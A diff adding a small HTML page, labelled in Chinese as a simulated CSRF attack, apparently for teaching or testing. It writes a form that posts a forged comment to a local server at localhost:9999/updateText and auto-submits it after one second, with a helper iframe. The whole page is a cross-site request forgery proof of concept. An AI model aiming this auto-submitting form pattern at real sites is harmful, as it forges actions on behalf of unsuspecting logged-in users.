@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    
+    <meta charset="utf-8">
+  </head>
+  <body>
+    CSRF模拟攻击
+    <script>
+      document.write(`
+      <form name="form" action="http://localhost:9999/updateText" method="post" target=baidu.com>
+        添加评论: <input type="text" name="text" value="CSRF评论。。" />
+      </form>
+      `)
+      var iframe = document.createElement('iframe')
+      iframe.name = 'csrf'
+    //   iframe.style.display = 'none'
+      document.body.appendChild(iframe)
+      setTimeout(function() {
+          debugger
+        document.querySelector('form').submit();
+      },1000)
+    </script>
+  </body>
+</html>
